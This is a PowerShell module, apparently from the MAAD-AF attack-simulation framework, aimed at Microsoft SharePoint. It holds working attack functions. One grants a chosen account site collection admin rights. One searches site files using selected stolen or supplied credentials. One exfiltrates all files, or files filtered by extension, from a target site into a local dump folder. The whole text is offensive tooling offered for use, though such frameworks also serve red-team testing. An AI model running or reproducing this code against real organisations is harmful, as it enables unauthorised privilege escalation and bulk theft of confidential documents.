#Sharepoint

function GrantAccessToSharpointSite {

    EnterAccount ("`n[?] Enter account to grant access (user@org.com)")
    $target_account = $global:account_username

    EnterSharepointSite ("`n[?] Enter SharePoint site to gain access to")

    $target_site_name = $global:sharepoint_site_name
    $target_site_url = $global:sharepoint_site_url

    #Grant access to site
    MAADWriteProcess "Attempting access grant to SharePoint site"
    MAADWriteProcess "Account: $target_account -> Site: $target_site_name"
    try {
        Set-SPOUser -Site $target_site_url -LoginName $target_account -IsSiteCollectionAdmin $true -ErrorAction Stop | Out-Null
        Start-Sleep -Seconds 5
        MAADWriteSuccess "Account Granted Access to Site" 
    }
    catch {
        MAADWriteError "Failed to get access to site"
    }
    Write-Host ""
    MAADPause
 }

 function SearchSharepointSite{
    EnterSharepointSite ("`n[?] Enter SharePoint site to search")
    $target_site_name = $global:sharepoint_site_name
    $target_site_url = $global:sharepoint_site_url

    #Select a credential to use
    UseCredential
    $target_current_username = $global:current_username
    $target_current_credential = $global:current_credentials

    #Connect to sharepoint site
    ConnectSharepointSite $target_site_url $target_current_credential
    if ($global:sp_site_connected -eq $true){

        #Find a file or all files
        while ($true) {
            MAADWriteInfo "Find files matching the search term"
            MAADWriteInfo "Enter [exit-module] to exit"
            $keyword = Read-Host -Prompt "`n[?] Enter search term"
            Write-Host ""
            
            if ($keyword -in "",$null) {
                MAADWriteError "Search term cannot be blank"
                MAADWriteInfo "You can type [exit-module] to exit"
            }

            if ($keyword -eq "exit-module") {
                MAADWriteProcess "Exiting file search module"
                break
            }

            if ($keyword -ne ""){
                #Searching for file
                MAADWriteProcess "Searching for files matching term -> $keyword"
                
                $current_time = Get-Date -Format "dd_MM_dd_yyyy_HH_mm"
                try{
                    $search_result = Find-PnPFile -Match *$keyword* 

                    if ($null -eq $search_result) {
                        MAADWriteError "No files found"
                    }
                    else {
                        MAADWriteProcess "Found $($search_result.Count) files"
                        $search_result | Out-File -FilePath .\Outputs\SharePoint_File_Search_Report_$current_time.txt -Append
                        MAADWriteProcess "Output Saved -> \MAAD-AF\Outputs\SharePoint_File_Search_Report_$current_time.txt"
                        if ($search_result.Count -gt 5){
                            MAADWriteProcess "Listing first 5 results"
                            MAADWriteSuccess "Search Completed" 
                            $search_result | Select-Object -First 5 | Format-Table
                        }
                        else{
                            MAADWriteSuccess "Search Completed" 
                            $search_result | Format-Table
                        }
                    }  
                }
                catch{
                    MAADWriteError "Failed to execute file search"
                }
            } 
            Write-Host ""
            MAADPause
        }
    }
}

 function ExfilDataFromSharepointSite{
    #Select a target site
    EnterSharepointSite ("`n[?] Enter SharePoint site name to exfiltrate")
    $target_site_name = $global:sharepoint_site_name
    $target_site_url = $global:sharepoint_site_url

    #Select a credential to use
    UseCredential
    $target_current_username = $global:current_username
    $target_current_credential = $global:current_credentials

    #Connect to sharepoint site
    ConnectSharepointSite $target_site_url $target_current_credential
    
    if ($global:sp_site_connected -eq $true){
        $current_time = Get-Date -Format "dd_MM_dd_yyyy_HH_mm"
        $current_dump_folder_name = "SP_Exfil_"+$current_time
        #Create a download folder
        if ((Test-Path -Path ".\Outputs\SharepointDump\$current_dump_folder_name") -eq $false){
            MAADWriteProcess "Creating directory -> \MAAD-AF\Outputs\SharePointDump\$current_dump_folder_name"
            New-Item -ItemType Directory -Force -Path .\Outputs\SharepointDump\$current_dump_folder_name | Out-Null
        }

        #Check user preference
        MAADWriteInfo "To exfil specific file type enter a file extension -> [docx] [pdf] [DWG]"
        MAADWriteInfo "Leave blank and press [Enter] to exfiltrate all files"
        $user_search_term = Read-Host -Prompt "`n[?] Enter term or file extension"
        Write-Host ""

        MAADWriteProcess "Initiating exfil from SharePoint"
        
        
        if ($user_search_term -in $null,""){
            MAADWriteProcess "Traversing through site to find all files"
            $all_files = Find-PnPFile -Match *
        }
        else {
            MAADWriteProcess "Traversing through site to find files matching the term"
            $all_files = Find-PnPFile -Match *$user_search_term*
        }

        MAADWriteProcess "Found $($all_files.Length) total files"
        MAADWriteProcess "Preparing to dump all found files to local directory"
        MAADWriteProcess "Resolving relative download paths for each file"
        MAADWriteProcess "Exfil in progress"
        Write-Progress -Activity "Exfiltrating data..." -Status "0% complete:" -PercentComplete 0;
        
        $counter = 0
        #Download all files
        foreach ($file in $all_files){ 
            #Resolve relative download path
            $file_sp_path = $file.Path.Identity.Split(":")[-1] 

            Get-PnPFile -Url $file_sp_path -Path ./Outputs/SharepointDump/$current_dump_folder_name -AsFile -Filename $file_sp_path.Replace("/","_")
            $counter++
            Write-Progress -Activity "SharePoint exfiltration in progress" -Status "$([math]::Round($counter/$all_files.Length * 100))% complete:" -PercentComplete ([math]::Round($counter/$all_files.Length * 100));
        }
        MAADWriteProcess "Output Saved -> \MAAD-AF\Outputs\SharePointDump\$current_dump_folder_name"
        MAADWriteProcess "Files Exfiltrated -> $counter/$($all_files.Length)"
        MAADWriteSuccess "SharePoint Site Data Exfiltrated" 
    }
    Write-Host ""
    MAADPause
}

